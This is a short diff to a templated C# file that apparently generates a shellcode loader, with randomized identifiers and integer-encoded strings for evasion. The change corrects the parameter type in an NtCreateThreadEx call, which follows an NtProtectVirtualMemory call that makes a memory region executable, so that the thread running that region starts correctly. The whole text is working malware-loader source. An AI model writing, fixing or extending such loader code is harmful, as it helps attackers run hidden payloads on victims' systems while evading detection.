@@ -10,7 +10,7 @@ namespace {{ appdomain_namespace }} {
         delegate int D_NtPVM(IntPtr ph, ref IntPtr ba, ref UIntPtr rs, uint np, out uint op);
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         delegate int D_NtCTX(out IntPtr hT, uint da, IntPtr oa, IntPtr ph, IntPtr sa,
-            IntPtr p, bool cs, IntPtr szb, IntPtr ssc, IntPtr ssr, IntPtr al);
+            IntPtr p, ulong cs, IntPtr szb, IntPtr ssc, IntPtr ssr, IntPtr al);
 
         static string B(int[] c) {
             var sb = new System.Text.StringBuilder();
@@ -100,7 +100,7 @@ namespace {{ appdomain_namespace }} {
                 ref {{ v.var_fiber }}, 0x20, out {{ v.fn_setup }}_old);
             IntPtr {{ v.fn_run }}_h;
             {{ v.fn_nt_thread }}(out {{ v.fn_run }}_h, 0x1FFFFF, IntPtr.Zero, (IntPtr)(-1),
-                {{ v.var_region }}, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+                {{ v.var_region }}, IntPtr.Zero, 0UL, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
             if ({{ v.fn_run }}_h != IntPtr.Zero)
                 System.Threading.Thread.Sleep(30000);
         }
